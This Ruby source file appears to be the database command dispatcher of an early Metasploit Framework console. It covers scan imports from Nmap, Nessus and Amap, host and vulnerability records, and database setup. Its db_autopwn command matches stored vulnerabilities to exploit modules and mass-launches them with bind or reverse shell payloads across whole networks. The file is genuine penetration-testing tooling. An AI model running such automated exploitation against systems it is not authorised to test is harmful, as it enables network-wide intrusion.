module Msf
module Ui
module Console
module CommandDispatcher
class Db

		require 'rexml/document'
		require 'tempfile'

		include Msf::Ui::Console::CommandDispatcher
			
		#
		# Constants
		#

		PWN_SHOW = 2**0
		PWN_XREF = 2**1
		PWN_PORT = 2**2
		PWN_EXPL = 2**3
		PWN_SING = 2**4
		PWN_SLNT = 2**5
		
		#
		# The dispatcher's name.
		#
		def name
			"Database Backend"
		end

		#
		# Returns the hash of commands supported by this dispatcher.
		#
		def commands
			base = {
				"db_driver"     => "Specify a database driver",
				"db_connect"    => "Connect to an existing database",
				"db_disconnect" => "Disconnect from the current database instance",
				"db_create"     => "Create a brand new database",
				"db_destroy"    => "Drop an existing database",
			}

			more = {
				"db_hosts"      => "List all hosts in the database",
				"db_services"   => "List all services in the database",
				"db_vulns"      => "List all vulnerabilities in the database",
				"db_notes"      => "List all notes in the database",
				"db_add_host"   => "Add one or more hosts to the database",
				"db_add_port"   => "Add a port to host",
				"db_add_note"   => "Add a note to host",
				"db_del_host"   => "Delete one or more hosts from the database",
				"db_autopwn"    => "Automatically exploit everything",
				"db_import_amap_mlog"   => "Import a THC-Amap scan results file (-o -m)",
				"db_import_nessus_nbe"  => "Import a Nessus scan result file (NBE)",
				"db_import_nmap_xml"    => "Import a Nmap scan results file (-oX)",
				"db_nmap"               => "Executes nmap and records the output automatically",
			}
			
			framework.db.active ? base.merge(more) : base
		end

		def cmd_db_hosts(*args)
			framework.db.each_host do |host|
				print_status("Time: #{host.created} Host: #{host.address} Status: #{host.state} OS: #{host.os_name} #{host.os_flavor}")
			end
		end

		def cmd_db_services(*args)
			framework.db.each_service do |service|
				print_status("Time: #{service.created} Service: host=#{service.host.address} port=#{service.port} proto=#{service.proto} state=#{service.state} name=#{service.name}")			
			end
		end		
		
		def cmd_db_vulns(*args)
			framework.db.each_vuln do |vuln|
				reflist = vuln.refs.map { |r| r.name }
				print_status("Time: #{vuln.created} Vuln: host=#{vuln.host.address} port=#{vuln.service.port} proto=#{vuln.service.proto} name=#{vuln.name} refs=#{reflist.join(',')}")
			end
		end	

		def cmd_db_notes(*args)
			framework.db.each_note do |note|
				print_status("Time: #{note.created} Note: host=#{note.host.address} type=#{note.ntype} data=#{note.data}")			
			end
		end	
				
		def cmd_db_add_host(*args)
			print_status("Adding #{args.length} hosts...")
			args.each do |address|
				host = framework.db.get_host(nil, address)
				print_status("Time: #{host.created} Host: host=#{host.address}")
			end
		end

		def cmd_db_add_port(*args)
			if (not args or args.length < 3)
				print_status("Usage: db_add_port [host] [port] [proto]")
				return
			end

			host = framework.db.get_host(nil, args[0])
			return if not host
			
			service = framework.db.get_service(nil, host, args[2].downcase, args[1].to_i)
			return if not service
			
			print_status("Time: #{service.created} Service: host=#{service.host.address} port=#{service.port} proto=#{service.proto} state=#{service.state}")
		end

		def cmd_db_add_note(*args)
			if (not args or args.length < 3)
				print_status("Usage: db_add_note [host] [type] [note]")
				return
			end

			naddr = args.shift 
			ntype = args.shift
			ndata = args.join(" ")

			host = framework.db.get_host(nil, naddr)
			return if not host
			
			note = framework.db.get_note(nil, host, ntype, ndata)
			return if not note
			
			print_status("Time: #{note.created} Note: host=#{note.host.address} type=#{note.ntype} data=#{note.data}")
		end
		
		
		def cmd_db_del_host(*args)
			args.each do |address|
				if framework.db.del_host(nil, address)
					print_status("Host #{address} deleted")
				end
			end
		end

		#
		# A shotgun approach to network-wide exploitation
		#
		def cmd_db_autopwn(*args)

			stamp = Time.now.to_f
			vcnt  = 0
			rcnt  = 0
			mode  = 0
			code  = :bind
			mjob  = 5
			regx  = nil
			
			port_inc = []
			port_exc = []
			
			targ_inc = []
			targ_exc = []
			
			args.push("-h") if args.length == 0
			
			while (arg = args.shift)
				case arg
				when '-t'
					mode |= PWN_SHOW
				when '-x'
					mode |= PWN_XREF
				when '-p'
					mode |= PWN_PORT
				when '-e'
					mode |= PWN_EXPL
				when '-s'
					mode |= PWN_SING
				when '-q'
					mode |= PWN_SLNT
				when '-j'
					mjob = args.shift.to_i
				when '-r'
					code = :conn
				when '-b'
					code = :bind
				when '-I'
					targ_inc << OptAddressRange.new('TEMPRANGE', [ true, '' ]).normalize(args.shift)
				when '-X'
					targ_exc << OptAddressRange.new('TEMPRANGE', [ true, '' ]).normalize(args.shift)
				when '-PI'
					port_inc = Rex::Socket.portspec_crack(args.shift)
				when '-PX'
					port_exc = Rex::Socket.portspec_crack(args.shift)
				when '-m'
					regx = args.shift
				when '-h'
					print_status("Usage: db_autopwn [options]")
					print_line("\t-h          Display this help text")
					print_line("\t-t          Show all matching exploit modules")
					print_line("\t-x          Select modules based on vulnerability references")
					print_line("\t-p          Select modules based on open ports")
					print_line("\t-e          Launch exploits against all matched targets")
#					print_line("\t-s          Only obtain a single shell per target system (NON-FUNCTIONAL)")
					print_line("\t-r          Use a reverse connect shell")
					print_line("\t-b          Use a bind shell on a random port")
					print_line("\t-q          Disable exploit module output")
					print_line("\t-I  [range] Only exploit hosts inside this range")
					print_line("\t-X  [range] Always exclude hosts inside this range")
					print_line("\t-PI [range] Only exploit hosts with these ports open")
					print_line("\t-PX [range] Always exclude hosts with these ports open")
					print_line("\t-m  [regex] Only run modules whose name matches the regex")
					print_line("")
					return
				end
			end

			matches = {}
			
			[ [framework.exploits, 'exploit' ], [ framework.auxiliary, 'auxiliary' ] ].each do |mtype|			
				# Scan all exploit modules for matching references
				mtype[0].each_module do |n,m|
					e = m.new
					
					#
					# Match based on vulnerability references
					#
					if (mode & PWN_XREF != 0)
						e.references.each do |r|
							rcnt += 1

							ref_name = r.ctx_id + '-' + r.ctx_val
							ref = framework.db.has_ref?(ref_name)
							
							if (ref)
								ref.vulns.each do |vuln|
									vcnt  += 1
									serv  = vuln.service
									next if not serv.host
									xport = serv.port
									xprot = serv.proto
									xhost = serv.host.address
									next if (targ_inc.length > 0 and not range_include?(targ_inc, xhost))
									next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))
									next if (port_inc.length > 0 and not port_inc.include?(serv.port.to_i))
									next if (port_exc.length > 0 and port_exc.include?(serv.port.to_i))
									next if (regx and n !~ /#{regx}/)
									
									matches[[xport,xprot,xhost,mtype[1]+'/'+n]]=true
								end
							end
						end
					end

					#
					# Match based on ports alone
					#
					if (mode & PWN_PORT != 0)
						rport = e.datastore['RPORT']
						if (rport)
							framework.db.services.each do |serv|
								next if not serv.host
								next if serv.port.to_i != rport.to_i
								xport = serv.port
								xprot = serv.proto
								xhost = serv.host.address
								next if (targ_inc.length > 0 and not range_include?(targ_inc, xhost))
								next if (targ_exc.length > 0 and range_include?(targ_exc, xhost))
							
								next if (port_inc.length > 0 and not port_inc.include?(serv.port.to_i))
								next if (port_exc.length > 0 and port_exc.include?(serv.port.to_i))
								next if (regx and n !~ /#{regx}/)
										
								matches[[xport,xprot,xhost,mtype[1]+'/'+n]]=true
							end
						end
					end					
				end
			end


			if (mode & PWN_SHOW != 0)
				print_status("Analysis completed in #{(Time.now.to_f - stamp)} seconds (#{vcnt} vulns / #{rcnt} refs)")
			end
			

			idx = 0
			matches.each_key do |xref|
			
				idx += 1
				
				begin
					mod = nil

					if ((mod = framework.modules.create(xref[3])) == nil)
						print_status("Failed to initialize #{xref[3]}")
						next
					end

					if (mode & PWN_SHOW != 0)
						print_status("Matched #{xref[3]} against #{xref[2]}:#{mod.datastore['RPORT']}...")
					end
					
					#
					# The code is just a proof-of-concept and will be expanded in the future
					#
					if (mode & PWN_EXPL != 0)

						mod.datastore['RHOST'] = xref[2]
						mod.datastore['RPORT'] = xref[0].to_s

						if (code == :bind)
							mod.datastore['LPORT']   = (rand(0x8fff) + 4000).to_s
							if(mod.fullname =~ /\/windows\//)
								mod.datastore['PAYLOAD'] = 'windows/meterpreter/bind_tcp'
							else
								mod.datastore['PAYLOAD'] = 'generic/shell_bind_tcp'
							end
						end
						
						if (code == :conn)
							mod.datastore['LHOST']   = 	Rex::Socket.source_address(xref[2])
							mod.datastore['LPORT']   = 	(rand(0x8fff) + 4000).to_s
							
							if (mod.datastore['LHOST'] == '127.0.0.1')
								print_status("Failed to determine listener address for target #{xref[2]}...")
								next
							end
							
							if(mod.fullname =~ /\/windows\//)
								mod.datastore['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
							else
								mod.datastore['PAYLOAD'] = 'generic/shell_reverse_tcp'
							end
						end
						
						
						if(framework.jobs.keys.length >= mjob)
							print_status("Job limit reached, waiting on modules to finish...")
							while(framework.jobs.keys.length >= mjob)
								select(nil, nil, nil, 0.25)
							end
						end
						

						next if not mod.autofilter()

						print_status("(#{idx}/#{matches.length}): Launching #{xref[3]} against #{xref[2]}:#{mod.datastore['RPORT']}...")

						
						begin
							inp = (mode & PWN_SLNT != 0) ? nil : driver.input
							out = (mode & PWN_SLNT != 0) ? nil : driver.output
						
							case mod.type
							when MODULE_EXPLOIT
								session = mod.exploit_simple(
									'Payload'        => mod.datastore['PAYLOAD'],
									'LocalInput'     => inp,
									'LocalOutput'    => out,
									'RunAsJob'       => true)
							when MODULE_AUX
								session = mod.run_simple(
									'LocalInput'     => inp,
									'LocalOutput'    => out,
									'RunAsJob'       => true)			
							end
						rescue ::Interrupt
							raise $!
						rescue ::Exception
							print_status(" >> autopwn exception during launch from #{xref[3]}: #{$!} ")
						end
					end
				
				rescue ::Interrupt
					raise $!
				rescue ::Exception
					print_status(" >> autopwn exception from #{xref[3]}: #{$!} #{$!.backtrace}")
				end
			end

		# EOM
		end

		
		#
		# Import Nessus NBE files
		#
		def cmd_db_import_nessus_nbe(*args)
			if (not (args and args.length == 1))
				print_status("Usage: db_import_nessus_nbe [nessus.nbe]")
				return
			end
			
			if (not File.readable?(args[0])) 
				print_status("Could not read the NBE file")
				return
			end
			
			fd = File.open(args[0], 'r')
			fd.each_line do |line|
				r = line.split('|')
				next if r[0] != 'results'
				addr = r[2]
				nasl = r[4]
				hole = r[5]
				data = r[6]
				refs = {}
				
				m = r[3].match(/^([^\(]+)\((\d+)\/([^\)]+)\)/)
				next if not m
				
				host = framework.db.get_host(nil, addr)
				next if not host
				
				if host.state != Msf::HostState::Alive
					framework.db.report_host_state(self, addr, Msf::HostState::Alive)
				end
					
				service = framework.db.get_service(nil, host, m[3].downcase, m[2].to_i)
				name = m[1].strip
				if name != "unknown"
					service.name = name
					service.save
				end
				
				next if not nasl
				
				data.gsub!("\\n", "\n")
				
				
				if (data =~ /^CVE : (.*)$/)
					$1.gsub(/C(VE|AN)\-/, '').split(',').map { |r| r.strip }.each do |r|
						refs[ 'CVE-' + r ] = true
					end
				end

				if (data =~ /^BID : (.*)$/)
					$1.split(',').map { |r| r.strip }.each do |r|
						refs[ 'BID-' + r ] = true
					end
				end

				if (data =~ /^Other references : (.*)$/)
					$1.split(',').map { |r| r.strip }.each do |r|
						ref_id, ref_val = r.split(':')
						ref_val ? refs[ ref_id + '-' + ref_val ] = true : refs[ ref_id ] = true
					end
				end
								
				refs[ 'NSS-' + nasl.to_s ] = true
								
				vuln = framework.db.get_vuln(nil, service, 'NSS-' + nasl.to_s, data)
				
				rids = []
				refs.keys.each do |r|
					rids << framework.db.get_ref(nil, r)
				end
				
				vuln.refs << (rids - vuln.refs)
			end
			fd.close
		end
		
		
		#
		# Import Nmap data from a file
		#
		def cmd_db_import_nmap_xml(*args)
			if (not (args and args.length == 1))
				print_status("Usage: db_import_nmap_xml [nmap.xml]")
				return
			end
			
			if (not File.readable?(args[0])) 
				print_status("Could not read the XML file")
				return
			end
			
			fd = File.open(args[0], 'r')
			data = fd.read
			fd.close
			
			load_nmap_xml(data)
		end

		#
		# Import Nmap data from a file
		#
		def cmd_db_nmap(*args)
			if (args.length == 0)
				print_status("Usage: db_nmap [nmap options]")
				return
			end
			
			nmap = 
				Rex::FileUtils.find_full_path("nmap") || 
				Rex::FileUtils.find_full_path("nmap.exe")
				
			if(not nmap)
				print_error("The nmap executable could not be found")
				return
			end

			fd = Tempfile.new('dbnmap')

			
			args.push('-oX', fd.path)
			args.unshift(nmap)
			
			cmd = args.map{|x| '"'+x+'"'}.join(" ")
			
			print_status("exec: #{cmd}")
			IO.popen( cmd ) do |io|
				io.each_line do |line|
					print_line("NMAP: " + line.strip)
				end
			end

			data = File.read(fd.path)
			fd.close
			
			File.unlink(fd.path)
						
			load_nmap_xml(data)
		end		
		
		#
		# Process Nmap XML data
		#
		def load_nmap_xml(data)
			doc = REXML::Document.new(data)
			doc.elements.each('/nmaprun/host') do |host|
				addr = host.elements['address'].attributes['addr']
				host.elements['ports'].elements.each('port') do |port|
					prot = port.attributes['protocol']
					pnum = port.attributes['portid']
					
					next if not port.elements['state']
					stat = port.elements['state'].attributes['state']
					
					next if not port.elements['service']
					name = port.elements['service'].attributes['name']

					next if stat != 'open'
					
					host = framework.db.get_host(nil, addr)
					next if not host

					if host.state != Msf::HostState::Alive
						framework.db.report_host_state(self, addr, Msf::HostState::Alive)
					end
					
					service = framework.db.get_service(nil, host, prot.downcase, pnum.to_i)
					if name != "unknown"
						service.name = name
						service.save
					end
				end
			end
		end
		
		#
		# Import from a THC-Amap machine-readable log file
		#
		def cmd_db_import_amap_mlog(*args)
			if args.length == 0
				print_status("Usage: db_import_amap_mlog [logfile]")
				return
			end

			if not File.readable?(args[0])
				print_error("Could not read the log file")
				return
			end

			fd = File.open(args[0], 'r')

			fd.each_line do |line|
				line.sub!(/#.*/, "")

				r = line.split(':')
				next if r.length < 6

				addr   = r[0]
				port   = r[1].to_i
				proto  = r[2].downcase
				status = r[3]
				name   = r[5]

				next if status != "open"

				host = framework.db.get_host(nil, addr)
				next if not host

				if host.state != Msf::HostState::Alive
					framework.db.report_host_state(self, addr, Msf::HostState::Alive)
				end

				service = framework.db.get_service(nil, host, proto, port)
				if not service.name and name != "unidentified"
					service.name = name
					service.save
				end
			end

			fd.close
		end

		#
		# Determine if an IP address is inside a given range
		#
		def range_include?(ranges, addr)

			ranges.each do |sets|
				sets.each do |set|
					rng = set.split('-').map{ |c| Rex::Socket::addr_atoi(c) }
					tst = Rex::Socket::addr_atoi(addr)
					if (tst >= rng[0] and tst <= rng[1])
						return true
					end
				end
			end
			
			false
		end
		
		
		#
		# Database management
		#
			
		def db_check_driver
			if(not framework.db.driver)
				print_error("No database driver has been specified")
				return false
			end
			true
		end

		def cmd_db_driver(*args)
		
			if(args[0])
				if(args[0] == "-h")
					print_status("Usage: db_driver [driver-name]")
					return
				end
			
				if(framework.db.drivers.include?(args[0]))
					framework.db.driver = args[0]
					print_status("Using database driver #{args[0]}")
				else
					print_error("Invalid driver specified")
				end
				return
			end
		
			if(framework.db.driver)
				print_status("   Active Driver: #{framework.db.driver}")
			else
				print_status("No Active Driver")
			end
			print_status("       Available: #{framework.db.drivers.join(", ")}")
		end
		
		def cmd_db_driver_tabs(str, words)
			return framework.db.drivers
		end
			
		def cmd_db_create(*args)
			return if not db_check_driver
			meth = "db_create_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end
		
		def cmd_db_destroy(*args)
			return if not db_check_driver
			meth = "db_destroy_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end
		
		def cmd_db_connect(*args)
			return if not db_check_driver
			meth = "db_connect_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end
		
		def cmd_db_disconnect(*args)
			return if not db_check_driver
			meth = "db_disconnect_#{framework.db.driver}"
			if(self.respond_to?(meth))
				self.send(meth, *args)
			else
				print_error("This database driver #{framework.db.driver} is not currently supported")
			end
		end

		
	
		#
		# Database management: SQLite3
		#
		
		#
		# Disconnect from the current SQLite3 instance
		#
		def db_disconnect_sqlite3(*args)
			if (framework.db)
				framework.db.disconnect()
			end
		end

		#
		# Connect to an existing SQLite database
		#
		def db_connect_sqlite3(*args)

			info = db_parse_db_uri_sqlite3(args[0])
			opts = { 'adapter' => 'sqlite3' }

			opts['dbfile'] = info[:path]

			if (not File.exists?(opts['dbfile']))
				print_error("The specified database does not exist")
				return
			end

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database")
			end

			print_status("Successfully connected to the database")
			print_status("File: #{opts['dbfile']}")			
		end

		#
		# Create a new SQLite database instance
		#				
		def db_create_sqlite3(*args)
			cmd_db_disconnect()
			
			info = db_parse_db_uri_sqlite3(args[0])
			opts = { 'adapter' => 'sqlite3' }
	
			opts['dbfile'] = info[:path]
			
			sql = ::File.join(Msf::Config.install_root, "data", "sql", "sqlite.sql")

			if (::File.exists?(opts['dbfile']))
				print_status("The specified database already exists, connecting")
			else
						
				print_status("Creating a new database instance...")
				require_library_or_gem('sqlite3')

				db = ::SQLite3::Database.new(opts['dbfile'])
				::File.read(sql).split(";").each do |line|
					begin
						db.execute(line.strip)
					rescue ::SQLite3::SQLException, ::SQLite3::MisuseException
					end
				end
				db.close
			end
			
			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database")
			end
		
			print_status("Successfully connected to the database")
			print_status("File: #{opts['dbfile']}")
		end

		#
		# Drop an existing database
		#
		def db_destroy_sqlite3(*args)
			cmd_db_disconnect()
			info = db_parse_db_uri_sqlite3(args[0])
			begin
				File.unlink(info[:path])
			rescue Errno::ENOENT
				print_error("The specified database does not exist")
			end
		end

		def db_parse_db_uri_sqlite3(path)
			res = {}
			res[:path] = path || ::File.join(Msf::Config.config_directory, 'sqlite3.db')
			res
		end
		
		#
		# Database management: MySQL
		#
			
		#
		# Disconnect from the current MySQL instance
		#
		def db_disconnect_mysql(*args)
			if (framework.db)
				framework.db.disconnect()
			end
		end

		#
		# Connect to an existing MySQL database
		#
		def db_connect_mysql(*args)
			info = db_parse_db_uri_mysql(args[0])
			opts = { 'adapter' => 'mysql' }
			
			opts['username'] = info[:user] if (info[:user])
			opts['password'] = info[:pass] if (info[:pass])
			opts['database'] = info[:name]
			opts['host'] = info[:host] if (info[:host])
			opts['port'] = info[:port] if (info[:port])

			# This is an ugly hack for a broken MySQL adapter:
			# 	http://dev.rubyonrails.org/ticket/3338
			if (opts['host'].strip.downcase == 'localhost')
				opts['host'] = Socket.gethostbyname("localhost")[3].unpack("C*").join(".")
			end
							
			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database")
			end
		end

		#
		# Create a new MySQL database instance
		#				
		def db_create_mysql(*args)
			cmd_db_disconnect()
			
			info = db_parse_db_uri_mysql(args[0])
			opts = { 'adapter' => 'mysql' }
						
			argv = []
			
			if (info[:user])
				opts['username'] = info[:user] 
				argv.push('-u')
				argv.push(info[:user])
			end
			
			if (info[:pass])
				argv.push('--password=' + info[:pass])
				opts['password'] = info[:pass]				
			end
			
			if (info[:host])
				opts['host'] = info[:host]
				argv.push('-h')
				argv.push(info[:host])
			end
			
			if (info[:port])
				opts['port'] = info[:port]
				argv.push('-P')
				argv.push(info[:port])
				
				# This is an ugly hack for a broken MySQL adapter:
				# 	http://dev.rubyonrails.org/ticket/3338
				if (opts['host'].strip.downcase == 'localhost')
					opts['host'] = Socket.gethostbyname("localhost")[3].unpack("C*").join(".")
				end
			end

			argv.push('-f')
			
			opts['database'] = info[:name]

			cargs = argv.map{|c| "'#{c}' "}.join
			
			sql = File.join(Msf::Config.install_root, "data", "sql", "mysql.sql")
			fd  = File.open(sql, 'r')
			
			system("mysqladmin #{cargs} drop #{info[:name]} >/dev/null 2>&1")
			system("mysqladmin #{cargs} create #{info[:name]}")

			psql = File.popen("mysql #{cargs} #{info[:name]}", "w")
			psql.write(fd.read)
			psql.close
			fd.close
			
			print_status("Database creation complete (check for errors)")

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database")
			end

		end

		#
		# Drop an existing database
		#
		def db_destroy_mysql(*args)

			cmd_db_disconnect()

			info = db_parse_db_uri_mysql(args[0])
			argv = []
			
			if (info[:user])
				argv.push('-u')
				argv.push(info[:user])
			end
			
			if (info[:pass])
				argv.push('--password=' + info[:pass])
			end
			
			if (info[:host])
				argv.push('-h')
				argv.push(info[:host])
			end
			
			if (info[:port])
				argv.push('-P')
				argv.push(info[:port])
			end
			
			argv.push("-f")

			cargs = argv.map{|c| "'#{c}' "}.join
			system("mysqladmin -f #{cargs} drop #{info[:name]}")
		end
		
		def db_parse_db_uri_mysql(path)
			res = {}
			if (path)
				auth, dest = path.split('@')
				(dest = auth and auth = nil) if not dest
				res[:user],res[:pass] = auth.split(':') if auth
				targ,name = dest.split('/')
				(name = targ and targ = nil) if not name
				res[:host],res[:port] = targ.split(':') if targ
			end
			res[:name] = name || 'metasploit3'
			res
		end
		
		#
		# Database management: Postgres
		#
		#
		# Disconnect from the current Postgres instance
		#
		def db_disconnect_postgresql(*args)
			if (framework.db)
				framework.db.disconnect()
			end
		end

		#
		# Connect to an existing Postgres database
		#
		def db_connect_postgresql(*args)
			info = db_parse_db_uri_postgresql(args[0])
			opts = { 'adapter' => 'postgresql' }

			opts['username'] = info[:user] if (info[:user])
			opts['password'] = info[:pass] if (info[:pass])
			opts['database'] = info[:name]
			opts['host'] = info[:host] if (info[:host])
			opts['port'] = info[:port] if (info[:port])
			
			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database")
			end
		end

		#
		# Create a new Postgres database instance
		#				
		def db_create_postgresql(*args)
			cmd_db_disconnect()
			
			info = db_parse_db_uri_postgresql(args[0])
			opts = { 'adapter' => 'postgresql' }
			argv = []

			if (info[:user])
				opts['username'] = info[:user] 
				argv.push('-U')
				argv.push(info[:user])
			else
				opts['username'] = 'postgres'
				argv.push('-U')
				argv.push('postgres')
			end

			if (info[:pass])
				print()
				print_status("Warning: You will need to enter the password at the prompts below")
				print()
				argv.push('-W')
			end
			
			if (info[:host])
				opts['host'] = info[:host]
				argv.push('-h')
				argv.push(info[:host])
			end
			
			if (info[:port])
				opts['port'] = info[:port]
				argv.push('-p')
				argv.push(info[:port])
			end
						
			opts['database'] = info[:name]

			cargs = argv.map{|c| "'#{c}' "}.join
			
			sql = File.join(Msf::Config.install_root, "data", "sql", "postgres.sql")
			fd  = File.open(sql, 'r')
			
			system("dropdb #{cargs} #{info[:name]} >/dev/null 2>&1")
			system("createdb #{cargs} #{info[:name]}")

			psql = File.popen("psql -q " + cargs + info[:name], "w")
			psql.write(fd.read)
			psql.close
			fd.close
			
			print_status("Database creation complete (check for errors)")

			if (not framework.db.connect(opts))
				raise RuntimeError.new("Failed to connect to the database")
			end
		end

		#
		# Drop an existing database
		#
		def db_destroy_postgresql(*args)

			cmd_db_disconnect()

			info = db_parse_db_uri_postgresql(args[0])
			argv = []
			
			if (info[:user])
				argv.push('-U')
				argv.push(info[:user])
			end
			
			if (info[:pass])
				print()
				print_status("Warning: You will need to enter the password at the prompts below")
				print()
				argv.push('-W')
			end
			
			if (info[:host])
				argv.push('-h')
				argv.push(info[:host])
			end
			
			if (info[:port])
				argv.push('-p')
				argv.push(info[:port])
			end

			cargs = argv.map{|c| "'#{c}' "}.join
			system("dropdb #{cargs} #{info[:name]}")
		end
		
		def db_parse_db_uri_postgresql(path)
			res = {}
			if (path)
				auth, dest = path.split('@')
				(dest = auth and auth = nil) if not dest
				res[:user],res[:pass] = auth.split(':') if auth
				targ,name = dest.split('/')
				(name = targ and targ = nil) if not name
				res[:host],res[:port] = targ.split(':') if targ
			end
			res[:name] = name || 'metasploit3'
			res
		end
								
end
end
end
end
end
